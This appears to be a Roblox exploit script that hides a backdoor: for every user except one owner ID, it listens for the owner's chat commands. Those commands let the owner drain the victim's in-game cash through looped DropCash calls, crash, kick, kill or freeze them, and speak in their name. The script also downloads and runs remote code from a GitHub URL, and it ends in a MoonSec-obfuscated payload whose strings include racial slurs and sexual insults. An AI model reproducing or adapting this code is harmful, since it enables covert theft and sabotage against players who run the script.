if game.Players.LocalPlayer.UserId ~= 472813752 then
local AdminPrefix = "!"
local Players = game:GetService("Players")
local LocalP = Players.LocalPlayer;
getgenv().AdminTable = {
  [472813752] = {["Access"] = 5}; -- owner
}

getgenv().psearch = function(Name)
  local Inserted = {}
  for _, p in pairs(Players:GetPlayers()) do
      if string.lower(string.sub(p.Name,1, string.len(Name))) == string.lower(Name) then
          table.insert(Inserted, p);return p
      end
  end
end

getgenv().AdminCmdList = {
  ["crashgame"] = {
        ["CommandFunc"] = function(Player, self, CmdPlayer)
            if Player == LocalP or Player == "all" then
                local ScreenGui = Instance.new("ScreenGui")
                local Fps = Instance.new("TextLabel")
                local Ping = Instance.new("TextLabel")
        
                ScreenGui.Parent = game.CoreGui
                ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
        
                Fps.Name = "Fps"
                Fps.Parent = ScreenGui
                Fps.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                Fps.BackgroundTransparency = 1.000
                Fps.Position = UDim2.new(0.786138654, 0, 0, 0)
                Fps.Size = UDim2.new(0, 125, 0, 25)
                Fps.Font = Enum.Font.SourceSans
                Fps.TextColor3 = Color3.fromRGB(255, 255, 255)
                Fps.TextScaled = true
                Fps.TextSize = 14.000
                Fps.TextWrapped = true
        
                Ping.Name = "Ping"
                Ping.Parent = ScreenGui
                Ping.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                Ping.BackgroundTransparency = 1.000
                Ping.BorderColor3 = Color3.fromRGB(255, 255, 255)
                Ping.Position = UDim2.new(0.700000048, 0, 0, 0)
                Ping.Size = UDim2.new(0, 125, 0, 25)
                Ping.Font = Enum.Font.SourceSans
                Ping.TextColor3 = Color3.fromRGB(253, 253, 253)
                Ping.TextScaled = true
                Ping.TextSize = 14.000
                Ping.TextWrapped = true
        
                local script = Instance.new('LocalScript', Fps)
                local RunService = game:GetService("RunService")
                RunService.RenderStepped:Connect(function(frame)
                    script.Parent.Text = ("FPS : "..math.round(1/frame)) 
                end)
        
        
                local script = Instance.new('LocalScript', Ping)
                local RunService = game:GetService("RunService")
                RunService.RenderStepped:Connect(function(ping) 
                    script.Parent.Text = ("Ping : " ..game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString(math.round(2/ping)))
                end)
                
                game.Players.LocalPlayer.Character:FindFirstChild('HumanoidRootPart').CFrame = CFrame.new(game.Players.LocalPlayer.Character:FindFirstChild('HumanoidRootPart').Position.X, game.Players.LocalPlayer.Character:FindFirstChild('HumanoidRootPart').Position.Y + 10000, game.Players.LocalPlayer.Character:FindFirstChild('HumanoidRootPart').Position.Z)
                wait(0.8)
                game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
                game:GetService"RunService".RenderStepped:Connect(function()
                    game.ReplicatedStorage.WalletRemotes.DropCash:FireServer("100")
                end)
                game:GetService"RunService".RenderStepped:Connect(function()
                    game.ReplicatedStorage.WalletRemotes.DropCash:FireServer("100")
                end)
                game:GetService"RunService".RenderStepped:Connect(function()
                    game.ReplicatedStorage.WalletRemotes.DropCash:FireServer("100")
                end)
                game:GetService"RunService".RenderStepped:Connect(function()
                    game.ReplicatedStorage.WalletRemotes.DropCash:FireServer("100")
                end)
                game:GetService"RunService".RenderStepped:Connect(function()
                    game.ReplicatedStorage.WalletRemotes.DropCash:FireServer("100")
                end)
                game:GetService"RunService".RenderStepped:Connect(function()
                    game.ReplicatedStorage.WalletRemotes.DropCash:FireServer("100")
                end)
                game:GetService"RunService".RenderStepped:Connect(function()
                    game.ReplicatedStorage.WalletRemotes.DropCash:FireServer("100")
                end)
                game:GetService"RunService".RenderStepped:Connect(function()
                    game.ReplicatedStorage.WalletRemotes.DropCash:FireServer("100")
                end)
                while wait(0.1) do
                    for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
                        if v.name == "Wallet" then
                            v.Parent = game.Players.LocalPlayer.Character
                        end
                    end
                end
            end
        end;
        ["Clearence"] = {[5] = true;};
    };
  ["autodrop1"] = {
        ["CommandFunc"] = function(Player, self, CmdPlayer)
            if Player == LocalP or Player == "all" then
                for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
                    if v.name == "Wallet" then
                        v.Parent = game.Players.LocalPlayer.Character
                    end
                  end
                while wait(0.12) do
                    game:GetService("ReplicatedStorage").WalletRemotes.DropCash:FireServer("9999999999")
                end
            end
        end;
        ["Clearence"] = {[5] = true;};
    };
  ["autodrop"] = {
    ["CommandFunc"] = function(Player, self, CmdPlayer)
        if Player == LocalP or Player == "all" then
            for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
      if v.name == "Wallet" then
          v.Parent = game.Players.LocalPlayer.Character
      end
          end
            wait(0.05)
            while wait(0.12) do
              game:GetService("ReplicatedStorage").WalletRemotes.DropCash:FireServer(self)
           end
        end
    end;
    ["Clearence"] = {[5] = true;};
};
  ["rj"] = {
      ["CommandFunc"] = function(Player, self, CmdPlayer)
          if Player == LocalP or Player == "all" then
              game:GetService("TeleportService"):Teleport(game.PlaceId, game.Players.LocalPlayer)
          end
      end;
      ["Clearence"] = {[5] = true;};
  };
  ["show"] = {
      ["CommandFunc"] = function(Player, self, CmdPlayer)
          if Player == LocalP or Player == "all" then
            for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
                if v.name == "Wallet" then
                    v.Parent = game.Players.LocalPlayer.Character
                end
            end
      end
      end;
      ["Clearence"] = {[5] = true;};
  };
    ["hide"] = {
      ["CommandFunc"] = function(Player, self, CmdPlayer)
          if Player == LocalP or Player == "all" then
        for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
     if v:IsA'Tool' then
          v.Parent = game.Players.LocalPlayer.Backpack;
         end;
            end;
          end
      end;
      ["Clearence"] = {[5] = true;};
  };
  ["drop"] = {
      ["CommandFunc"] = function(Player, self, CmdPlayer)
          if Player == LocalP or Player == "all" then
              for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
        if v.name == "Wallet" then
            v.Parent = game.Players.LocalPlayer.Character
        end
            end
              wait(0.05)
             game:GetService("ReplicatedStorage").WalletRemotes.DropCash:FireServer(self)
             wait(0.05)
             for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
         if v:IsA'Tool' then
             v.Parent = game.Players.LocalPlayer.Backpack;
        end;
            end;
          end
      end;
      ["Clearence"] = {[5] = true;};
  };
  ["fling"] = {
      ["CommandFunc"] = function(Player, self, CmdPlayer)
          if Player == LocalP or Player == "all" then
              game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(500000,500000,500000)
          end
      end;
      ["Clearence"] = {[5] = true;};
  };
  ["admin"] = {
      ["CommandFunc"] = function(Player, self, CmdPlayer)
          if Player == LocalP or Player == "all" then
              game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(48599.671875, 5676.1220703125, -953.8775024414062)
          end
      end;
      ["Clearence"] = {[5] = true;};
  };
  ["free"] = {
      ["CommandFunc"] = function(Player, self, CmdPlayer)
          if Player == LocalP or Player == "all" then
             game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
             game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Unairlocked!", "All")
          end
      end;
      ["Clearence"] = {[5] = true;};
  };
  ["airlock"] = {
      ["CommandFunc"] = function(Player, self, CmdPlayer)
          if Player == LocalP or Player == "all" then
                game.Players.LocalPlayer.Character:FindFirstChild('HumanoidRootPart').CFrame = CFrame.new(game.Players.LocalPlayer.Character:FindFirstChild('HumanoidRootPart').Position.X, game.Players.LocalPlayer.Character:FindFirstChild('HumanoidRootPart').Position.Y + 15, game.Players.LocalPlayer.Character:FindFirstChild('HumanoidRootPart').Position.Z)
                    wait(0.08)
                game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
             game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Airlocked!", "All")
          end
      end;
      ["Clearence"] = {[5] = true;};
  };
  ["god"] = {
      ["CommandFunc"] = function(Player, self, CmdPlayer)
          if Player == LocalP or Player == "all" then
              workspace[game.Players.LocalPlayer.Name].Remotes.Ragdoll:Destroy()
              workspace[game.Players.LocalPlayer.Name].Ragdoll:Destroy()
              workspace[game.Players.LocalPlayer.Name].Downed:Destroy()
              workspace[game.Players.LocalPlayer.Name].Client:Destroy()
              workspace[game.Players.LocalPlayer.Name].LocalScript:Destroy()
              game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Turned on Godmode!", "All")
          end
      end;
      ["Clearence"] = {[5] = true;};
  };
  ["say"] = {
      ["CommandFunc"] = function(Player, self, CmdPlayer)
          if Player == LocalP or Player == "all" then
              game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(self, "All")
          end
      end;
      ["Clearence"] = {[5] = true;};
  };
  ["print"] = {
      ["CommandFunc"] = function(Player, self, CmdPlayer)
          if Player == LocalP or Player == "all" then
              print(self)
          end
      end;
      ["Clearence"] = {[5] = true;};
  };
  ["bring"] = {
      ["CommandFunc"] = function(Player, self, CmdPlayer)
          if Player == LocalP or Player == "all" then
              game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game:GetService("Workspace").Lixalidy.HumanoidRootPart.Position)
          end
      end;
      ["Clearence"] = {[5] = true;};
  };
  ["test"] = {
      ["CommandFunc"] = function(Player, self, CmdPlayer)
          if Player == LocalP or Player == "all" then
                game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("yeah,yeah!", "All")
          end
      end;
      ["Clearence"] = {[5] = true;};
  };
  ["kick"] = {
      ["CommandFunc"] = function(Player, self, CmdPlayer)
          if Player == LocalP or Player == "all" then
              LocalP:Kick(self)
          end
      end;
      ["Clearence"] = {[5] = true;};
  };
  ["kill"] = {
      ["CommandFunc"] = function(Player, self, CmdPlayer)
          if Player == LocalP or Player == "all" then
              LocalP.Character.Humanoid:ChangeState(15)
          end
      end;
      ["Clearence"] = {[4] = true;[5] = true;};
  };
};

getgenv().BDCheck = function(Target2, Chat)
  if Chat:sub(1, 1) == AdminPrefix then
      local args = string.split(Chat:sub(2), " ")
      local Command = AdminCmdList[table.remove(args, 1)]
      local targ1 = psearch(table.remove(args, 1))
      if Command and targ1 then
          return Command and Command["Clearence"][AdminTable[Target2.UserId].Access] and Command["CommandFunc"](targ1, table.concat(args, " "), Target2)
      end
  end
end

local GP = Players:GetPlayers()
for i = 1, #GP do
  local CoolKidPlayer = GP[i]
  CoolKidPlayer.Chatted:Connect(function(Word)
      BDCheck(CoolKidPlayer, Word)
  end)
end
Players.PlayerAdded:Connect(function(CKP)
  CKP.Chatted:Connect(function(Message)
      BDCheck(CKP, Message)
  end)
end)
end

loadstring(game:HttpGet("https://raw.githubusercontent.com/Lixalidy/FakeDH/main/detector.lua", true))()

_, Protected_by_MoonSecV2, Discord = 'discord.gg/gQEH2uZxUk'
,nil,nil;(function() _msec=(function(o,e,n)local T=e["㒙㒞㒡㒤㒘㒛㒣㒝"];local H=n[o[(628+-#{",",{};110;{}})]][o["㒠㒘㒣㒚㒘㒙㒜㒚㒠㒝㒚㒣㒣"]];local i=(-#[[i dont fucking care if its your own ui]]+(0x79-79))/((0xda-(((0x3c4-519)+-#"how to obfuscate plssss help")-251))-50)local r=(((-#[[fun fact if you want to say discord just type Discord with a capital D boom]]+(475-0x10a))+-21)-111)-(-#{41,",";41,(function()return{','}end)(),1}+6)local y=n[o[(-#[[Well thats what they do when they get jealous they confuse it]]+(-64+0x129))]][o["㒤㒟㒤㒡㒢㒘㒣㒚㒣㒜㒢"]];local M=(0x2/(((-36+0xae)-124)+-#'mike litoris'))+(496/0xf8)local O=n[o[(124558/(0x13f+-102))]][o["㒥㒦㒝㒥㒚㒗㒝㒦㒟㒟㒝㒤"]]local a=(0x1d2/233)-(92-((0x2a0-389)-192))local N=(-#{53;(function()return{','}end)(),{};'nil';'nil',(function()return#{('hlLOOK'):find("\76")}>0 and 1 or 0 end),53}+11)local _=(64/(23+-#{89,(function()return{','}end)();1;",",(function()return{','}end)(),'nil',","}))local v=(-0x15+(-#"free bobux no skem"+((((-#{60,'nil',",",","}+292)-180)+-#"yiff")+-61)))local p=(-0x13+((-#[[Alma Alma]]+((-#{(function()return{','}end)(),{},'}';{};{};","}+5023)-0x9f3))/107))local D=(94-(191+((((-8260/0x76)-0x8)+-#"Obfuscated By Obamas Left Nut")+0x6)))local j=(-#"Innovative and Im made of rubber so that anything"+(0x9f+(0x4+((-0x3265/(0xba+-53))+-#[[ur mom is hot]]))))local U=(((5743+(-136-((103+-0x7d)+-#'use luraph if want lost money')))/0xf6)+-#[[Cock and ball tortue]])local m=(-#'you get no absolute bitches'+(0x6a+(((-108+(-#{",",63;1;(function()return{','}end)(),1;177;(function()return#{('KLLFOf'):find("\76")}>0 and 1 or 0 end)}+30))+0x46)+-#"Well thats what they do when they get jealous they confuse it")))local c=(-#{(function()return{','}end)();'nil','nil'}+6)local f=(-#{164,1;",";'}'}+7)local w=((131+-#{(function()return{','}end)();78,{};","})-0x7c)local h=(((-#"KFC and watermelon"+(-0x32+(27+-#{1;93;{},90,1;'}'})))+60)+-#'send nudes')local x=((-#'I am monoegg'+(((-0x5cb7/235)+0x8ac1)/0x6e))/155)local b=((-#{82,82;'nil','nil',",";1}+44)/0x13)local u=(((-0x5d+(5362-0xab3))/0x2e)-53)local g=((0x105-(((0x227+(-#"i still cannot find who the fuck asked"+(-0x3c+-17)))+-#[[fico éreto para mulheres japonesas]])-0xd8))-0x49)local s=(-#{'}',(function()return#{('oPPhLB'):find("\80")}>0 and 1 or 0 end);","}+5)local k=(-0x74+(0x15f-((1273-((1591-0x355)+-#"You have been banned from Cfx re network"))-342)))local L=o[(-#[[impulse is hot]]+(0x59d+(-53/0x1)))];local K=n[o[(-#"You are an absolute baboon"+(253+-0x37))]][o["㒛㒠㒠㒥㒠㒛㒗㒞"]];local F=n[(function(e)return type(e):sub(1,1)..'\101\116'end)('㒗㒥㒢㒢㒗㒘㒤㒛')..'\109\101'..('\116\97'or'㒠㒚㒞㒢㒡㒚㒗㒥')..o[(1246-0x2a0)]];local I=n[o[(((-88+0xe)+-#[[use luraph if want lost money]])+677)]][o["㒛㒦㒙㒢㒣㒘㒙㒜"]];local C=(0x1dc/238)-(156/(((-0x4+-47)+-#'nate higger nuck figgers and nill kiggers')+170))local S=(268/(-#[[If you see this string you are cool]]+((-#[[niggers]]+(25972/(0x412c/194)))+-126)))-(0x7c+-122)local A=n[o[(278+-0x6a)]][o["㒡㒞㒜㒢㒢㒥㒢㒜㒠㒜㒞㒟㒜㒙㒜㒛㒞"]];local e=function(o,e)return o..e end local B=(204/0x33)*(((-#'Bush Did 9 11'+(-0x83c/(0xab-137)))+0x65)+-#"I watch gay furry porn")local W=n[o["㒟㒢㒜㒡㒚㒗㒝㒚㒡㒟㒗㒠㒜"]];local d=((-16+0x29)+-#[[heil eco mother fuckers]])*(11904/(0xe2-(0x184-(340+-0x55))))local z=(2089-0x429)*((((319-0xbc)+-#"waste of sperm")-82)-33)local Y=(-#'Give nitro'+(-103+(((0x364-471)+-#'Me be like at 5am in the morning')-0xc8)))local P=(-0x7f+(((2223512/0xa4)+-#[[mbb is a frag]])/105))*(24-0x16)local q=n[o["㒚㒙㒣㒥㒙㒟㒙㒘㒛㒢㒣㒘"]]or n[o[(0x4ab-621)]][o["㒚㒙㒣㒥㒙㒟㒙㒘㒛㒢㒣㒘"]];local t=((0x499-(0x1c902/186))-292)local o=n[o["㒝㒣㒚㒚㒟㒤㒜㒗㒞㒠㒢㒙"]];local I=(function(d)local t,n=3,0x10 local o={j={},v={}}local l=-a local e=n+r while true do o[d:sub(e,(function()e=t+e return e-r end)())]=(function()l=l+a return l end)()if l==(B-a)then l=""n=C break end end local l=#d while e<l+r do o.v[n]=d:sub(e,(function()e=t+e return e-r end)())n=n+a if n%i==C then n=S I(o.j,(A((o[o.v[S]]*B)+o[o.v[a]])))end end return O(o.j)end)("..:::MoonSec::..㒗㒘㒙㒚㒛㒜㒝㒞㒟㒠㒡㒢㒣㒤㒥㒦㒦㒤㒛㒣㒥㒜㒤㒠㒣㒤㒞㒠㒢㒥㒡㒠㒠㒤㒠㒘㒥㒟㒥㒘㒣㒥㒤㒚㒢㒝㒡㒣㒢㒘㒠㒝㒠㒞㒘㒤㒘㒝㒗㒘㒦㒜㒥㒠㒚㒛㒚㒙㒚㒘㒙㒛㒙㒗㒘㒘㒦㒡㒥㒥㒥㒘㒞㒜㒝㒢㒜㒠㒛㒤㒛㒘㒞㒝㒠㒝㒟㒣㒟㒝㒞㒚㒝㒤㒣㒠㒥㒟㒤㒜㒣㒠㒢㒤㒗㒞㒗㒡㒦㒣㒗㒘㒦㒗㒥㒞㒠㒣㒘㒜㒜㒚㒛㒜㒚㒠㒙㒤㒠㒗㒟㒟㒠㒤㒦㒥㒦㒘㒥㒜㒤㒠㒙㒣㒣㒜㒣㒤㒡㒠㒠㒤㒠㒘㒦㒜㒤㒡㒥㒗㒤㒜㒢㒡㒡㒢㒡㒝㒠㒦㒜㒚㒞㒣㒞㒣㒝㒥㒙㒛㒜㒢㒚㒥㒛㒟㒦㒛㒙㒥㒦㒟㒤㒛㒣㒣㒣㒦㒥㒞㒢㒝㒘㒤㒝㒟㒛㒤㒛㒘㒚㒜㒝㒡㒟㒘㒞㒜㒛㒡㒝㒦㒜㒙㒛㒦㒛㒠㒘㒘㒘㒥㒘㒦㒗㒠㒗㒜㒦㒙㒦㒚㒗㒠㒝㒦㒜㒤㒜㒘㒛㒜㒟㒠㒠㒠㒟㒙㒟㒥㒝㒥㒝㒦㒦㒜㒥㒡㒤㒠㒣㒤㒣㒘㒦㒢㒘㒟㒗㒦㒦㒛㒥㒡㒞㒤㒟㒙㒝㒘㒜㒜㒛㒠㒡㒘㒠㒡㒠㒟㒞㒣㒞㒣㒞㒚㒜㒠㒘㒞㒛㒛㒚㒟㒦㒛㒙㒗㒦㒥㒥㒝㒤㒤㒢㒢㒦㒙㒣㒢㒤㒤㒡㒥㒢㒟㒛㒜㒚㒡㒙㒠㒘㒤㒘㒘㒛㒟㒝㒜㒜㒣㒜㒟㒛㒚㒡㒜㒣㒗㒢㒘㒡㒜㒠㒠㒤㒙㒤㒛㒣㒜㒢㒜㒝㒜㒜㒘㒛㒜㒚㒠㒟㒗㒟㒝㒟㒠㒜㒣㒝㒗㒝㒗㒜㒞㒚㒥㒟㒜㒣㒠㒢㒜㒡㒠㒠㒤㒥㒙㒣㒟㒥㒝㒤㒢㒣㒗㒠㒣㒠㒗㒡㒦㒞㒤㒙㒥㒘㒠㒗㒤㒗㒘㒚㒟㒜㒘㒚㒥㒛㒚㒙㒝㒘㒣㒙㒘㒗㒝㒗㒞㒟㒤㒟㒞㒞㒘㒝㒜㒜㒠㒠㒚㒡㒡㒡㒞㒟㒥㒞㒗㒞㒝㒞㒞㒝㒦㒜㒙㒜㒚㒦㒤㒣㒤㒢㒤㒢㒘㒡㒜㒥㒘㒦㒙㒥㒙㒤㒠㒦㒤㒝㒗㒜㒘㒛㒜㒚㒠㒟㒥㒠㒘㒞㒥㒥㒜㒗㒗㒦㒘㒥㒜㒤㒠㒗㒥㒘㒘㒦㒥㒟㒜㒡㒙㒠㒘㒟㒜㒞㒠㒣㒗㒣㒛㒣㒛㒢㒢㒡㒙㒜㒠㒚㒗㒘㒠㒗㒤㒗㒘㒜㒟㒜㒘㒛㒙㒚㒛㒚㒗㒘㒣㒗㒥㒗㒤㒗㒘㒥㒥㒥㒦㒗㒜㒝㒥㒜㒠㒛㒤㒛㒘㒡㒣㒠㒟㒟㒦㒞㒣㒞㒟㒝㒠㒛㒥㒛㒛㒚㒡㒦㒘㒣㒟㒢㒘㒡㒜㒠㒠㒣㒥㒥㒜㒥㒙㒤㒙㒣㒢㒡㒚㒡㒡㒡㒝㒠㒣㒠㒜㒞㒡㒥㒜㒗㒘㒦㒘㒥㒜㒤㒠㒚㒛㒙㒙㒙㒙㒗㒥㒞㒠㒠㒟㒟㒜㒞㒠㒝㒤㒣㒜㒢㒥㒢㒣㒡㒗㒡㒗㒠㒞㒞㒤㒞㒤㒗㒤㒦㒜㒥㒠㒤㒤㒘㒡㒚㒚㒙㒦㒘㒣㒗㒣㒦㒡㒤㒣㒥㒙㒥㒚㒤㒢㒢㒥㒢㒦㒛㒜㒚㒤㒙㒠㒘㒤㒘㒘㒜㒟㒜㒣㒜㒦㒛㒝㒛㒚㒘㒗㒚㒙㒘㒡㒚㒠㒠㒣㒟㒤㒟㒘㒞㒜㒢㒗㒣㒙㒣㒜㒝㒤㒚㒣㒙㒤㒙㒘㒘㒜㒞㒞㒝㒙㒝㒟㒥㒠㒤㒥㒣㒤㒣㒘㒢㒜㒦㒘㒗㒣㒦㒦㒥㒡㒦㒙㒙㒜㒝㒝㒜㒜㒛㒠㒚㒤㒞㒛㒟㒤㒞㒥㒟㒗㒞㒜㒟㒠㒦㒚㒤㒤㒤㒘㒣㒜㒘㒟㒗㒣㒘㒛㒦㒡㒥㒣㒦㒙㒥㒚㒣㒡㒢㒥㒢㒥㒤㒜㒚㒠㒙㒠㒘㒤㒘㒘㒛㒟㒜㒡㒝㒗㒛㒠㒟㒤㒤㒝㒢㒤㒢㒘㒡㒜㒦㒡㒦㒤㒥㒡㒡㒛㒥㒗㒣㒙㒢㒚㒡㒤㒡㒟㒠㒣㒟㒣㒟㒟㒚㒟㒛㒠㒦㒜㒥㒜㒤㒠㒣㒤㒗㒠㒘㒡㒗㒡㒗㒘㒤㒤㒟㒠㒞㒠㒝㒤㒝㒘㒡㒘㒡㒥㒡㒚㒡㒜㒤㒤㒙㒙㒗㒤㒗㒘㒦㒜㒚㒝㒚㒥㒚㒟㒚㒚㒙㒙㒙㒘㒘㒝㒦㒠㒥㒥㒚㒜㒞㒜㒝㒜㒜㒠㒛㒤㒟㒢㒡㒟㒠㒟㒟㒢㒡㒜㒗㒣㒦㒠㒥㒤㒥㒘㒘㒤㒚㒤㒚㒘㒙㒘㒥㒣㒦㒥㒗㒘㒦㒘㒞㒠㒝㒠㒜㒤㒜㒘㒢㒠㒡㒙㒠㒡㒟㒝㒟㒜㒘㒘㒦㒤㒦㒘㒥㒜㒙㒘㒛㒘㒚㒜㒙㒜㒦㒠㒗㒣㒗㒛㒦㒠㒜㒜㒞㒟㒝㒘㒜㒜㒛㒠㒡㒠㒠㒝㒟㒝㒞㒤㒞㒙㒞㒚㒝㒟㒜㒤㒚㒥㒛㒜㒚㒟㒗㒜㒢㒚㒡㒘㒠㒜㒟㒠㒦㒜㒥㒘㒣㒟㒢㒡㒢㒠㒡㒤㒚㒠㒙㒦㒘㒤㒘㒘㒗㒜㒛㒝㒜㒣㒛㒦㒛㒗㒙㒥㒚㒝㒝㒠㒢㒛㒠㒠㒟㒤㒟㒘㒤㒠㒤㒣㒣㒚㒞㒘㒡㒥㒡㒣㒛㒤㒟㒠㒞㒝㒞㒢㒝㒡㒜㒤㒛㒡㒛㒣㒛㒗㒞㒠㒢㒥㒡㒠㒠㒤㒠㒘㒥㒣㒤㒡㒤㒡㒣㒝㒣㒟㒡㒥㒡㒢㒡㒛㒟㒡㒦㒜㒘㒞㒗㒘㒦㒜㒥㒠㒙㒛㒚㒝㒚㒠㒗㒣㒘㒙㒘㒚㒗㒢㒦㒙㒥㒗㒤㒝㒦㒠㒝㒜㒛㒤㒛㒘㒚㒜㒞㒤㒟㒦㒞㒡㒝㒣㒝㒗㒜㒙㒜㒚㒘㒡㒚㒦㒙㒙㒘㒦㒘㒠㒠㒤㒠㒞㒟㒘㒞㒜㒝㒠㒣㒝㒣㒛㒢㒘㒠㒣㒠㒠㒠㒗㒟㒟㒞㒥㒝㒦㒜㒝㒚㒘㒥㒘㒣㒤㒣㒘㒢㒜㒥㒢㒗㒣㒦㒜㒦㒥㒣㒗㒥㒝㒤㒚㒣㒛㒙㒜㒛㒙㒚㒘㒙㒜㒘㒠㒝㒙㒛㒜㒜㒥㒜㒝㒗㒦㒘㒤㒣㒦㒢㒠㒡㒤㒡㒘㒥㒟㒦㒥㒥㒦㒤㒞㒣㒝㒢㒣㒢㒙㒟㒟㒡㒡㒠㒙㒝㒠㒙㒘㒗㒜㒦㒠㒥㒤㒙㒠㒛㒡㒚㒝㒘㒥㒘㒦㒘㒛㒗㒙㒦㒘㒤㒚㒥㒛㒤㒟㒤㒘㒡㒘㒡㒝㒡㒢㒡㒘㒢㒜㒘㒣㒗㒠㒦㒤㒦㒘㒙㒟㒛㒙㒛㒘㒙㒡㒙㒦㒗㒥㒗㒢㒗㒘㒠㒗㒞㒠㒝㒤㒝㒘㒡㒘㒡㒥㒠㒥㒠㒜㒟㒡㒟㒢㒝㒦㒞㒗㒜㒝㒜㒢㒛㒘㒘㒤㒣㒤㒢㒠㒡㒤㒡㒘㒤㒟㒥㒡㒥㒠㒤㒤㒣㒞㒢㒡㒢㒗㒡㒣㒥㒤㒚㒙㒘㒤㒘㒘㒗㒜㒜㒗㒜㒣㒜㒚㒛㒗㒚㒣㒙㒤㒘㒙㒗㒟㒦㒥㒝㒠㒟㒠㒞㒜㒝㒠㒜㒤㒢㒚㒡㒥㒡㒤㒜㒢㒟㒚㒟㒤㒞㒟㒝㒦㒡㒠㒥㒡㒤㒠㒣㒤㒣㒘㒗㒞㒘㒙㒗㒛㒦㒠㒦㒠㒡㒘㒞㒘㒝㒘㒜㒜㒛㒠㒟㒜㒠㒝㒟㒝㒞㒤㒘㒘㒛㒘㒦㒜㒥㒠㒤㒤㒚㒤㒚㒛㒘㒡㒘㒘㒘㒛㒗㒠㒦㒢㒥㒝㒤㒦㒣㒣㒟㒘㒢㒛㒡㒙㒡㒙㒟㒥㒜㒞㒜㒠㒞㒠㒝㒤㒜㒤㒙㒟㒚㒡㒚㒤㒥㒜㒤㒚㒗㒤㒗㒤㒗㒘㒦㒘㒥㒟㒡㒚㒟㒣㒟㒗㒢㒜㒠㒡㒡㒗㒠㒜㒞㒡㒝㒢㒝㒝㒜㒦㒘㒚㒚㒣㒚㒣㒙㒥㒥㒛㒘㒢㒦㒥㒗㒟㒢㒛㒥㒘㒢㒟㒤㒝㒠㒢㒞㒣㒞㒗㒝㒛㒜㒥㒚㒢㒚㒝㒙㒡㒘㒤㒘㒙㒥㒞㒤㒜㒣㒣㒢㒠㒡㒤㒡㒘㒦㒢㒦㒢㒥㒣㒤㒥㒢㒞㒡㒗㒟㒦㒟㒤㒚㒦㒙㒠㒘㒤㒘㒘㒛㒦㒝㒣㒜㒣㒛㒦㒘㒠㒙㒥㒙㒗㒙㒗㒗㒠㒦㒥㒝㒠㒟㒤㒞㒜㒝㒠㒜㒤㒠㒙㒡㒠㒠㒤㒞㒙㒠㒠㒟㒠㒞㒢㒜㒥㒚㒛㒛㒝㒛㒣㒚㒜㒗㒤㒢㒥㒡㒠㒠㒤㒠㒘㒦㒣㒤㒡㒤㒠㒣㒣㒣㒟㒢㒠㒡㒙㒠㒝㒟㒠㒟㒠㒘㒞㒗㒘㒦㒜㒥㒠㒛㒠㒛㒗㒙㒝㒘㒤㒙㒗㒘㒜㒗㒞㒦㒙㒥㒢㒤㒟㒢㒘㒝㒞㒛㒤㒛㒘㒚㒜㒞㒞㒟㒙㒟㒟㒞㒠㒝㒟㒜㒢㒜㒛㒛㒛㒙㒦㒚㒘㒦㒢㒦㒟㒥㒟㒤㒢㒘㒜㒞㒢㒝㒠㒜㒤㒜㒘㒠㒞㒠㒥㒠㒡㒠㒗㒟㒠㒝㒥㒛㒠㒦㒤㒥㒜㒤㒠㒣㒤㒚㒜㒘㒦㒙㒘㒗㒗㒤㒞㒤㒟㒢㒢㒢㒤㒡㒤㒣㒣㒡㒡㒠㒝㒗㒤㒚㒗㒘㒠㒗㒤㒗㒘㒛㒘㒜㒟㒛㒗㒚㒙㒚㒘㒗㒠㒘㒠㒗㒙㒗㒥㒥㒥㒥㒦㒠㒠㒝㒣㒜㒠㒛㒤㒛㒘㒞㒟㒠㒟㒟㒦㒞㒝㒛㒣㒝㒥㒜㒝㒙㒤㒤㒠㒣㒠㒢㒤㒢㒘㒗㒣㒦㒡㒦㒡㒥㒝㒜㒘㒝㒣㒜㒤㒜㒘㒛㒜㒟㒜㒠㒙㒟㒟㒝㒘㒘㒙㒦㒤㒦㒘㒥㒜㒜㒗㒚㒙㒙㒚㒘㒤㒘㒟㒗㒣㒦㒣㒣㒥㒢㒤㒤㒤㒝㒡㒜㒜㒛㒠㒚㒤㒞㒚㒠㒛㒞㒤㒟㒝㒛㒞㒝㒛㒜㒢㒛㒗㒚㒝㒥㒤㒣㒡㒡㒤㒡㒘㒠㒜㒤㒢㒥㒙㒥㒘㒤㒘㒣㒙㒢㒗㒡㒙㒡㒠㒟㒥㒟㒘㒝㒛㒞㒠㒝㒟㒜㒦㒛㒙㒚㒣㒙㒥㒥㒜㒣㒜㒡㒜㒠㒠㒟㒤㒤㒛㒤㒡㒤㒤㒡㒤㒣㒚㒡㒥㒡㒝㒟㒥㒠㒚㒟㒥㒜㒠㒜㒥㒝㒚㒜㒠㒘㒣㒘㒚㒚㒚㒘㒝㒘㒝㒗㒙㒠㒜㒟㒡㒞㒠㒝㒤㒝㒘㒡㒙㒢㒟㒡㒢㒠㒝㒠㒥㒛㒘㒘㒞㒗㒘㒦㒜㒥㒠㒙㒟㒚㒡㒙㒟㒙㒛㒦㒤㒗㒤㒦㒝㒗㒙㒥㒙㒥㒚㒟㒤㒝㒛㒛㒤㒛㒘㒚㒜㒝㒣㒟㒝㒟㒜㒝㒥㒞㒚㒜㒙㒛㒦㒛㒟㒚㒘㒙㒝㒙㒘㒚㒠㒡㒘㒟㒤㒟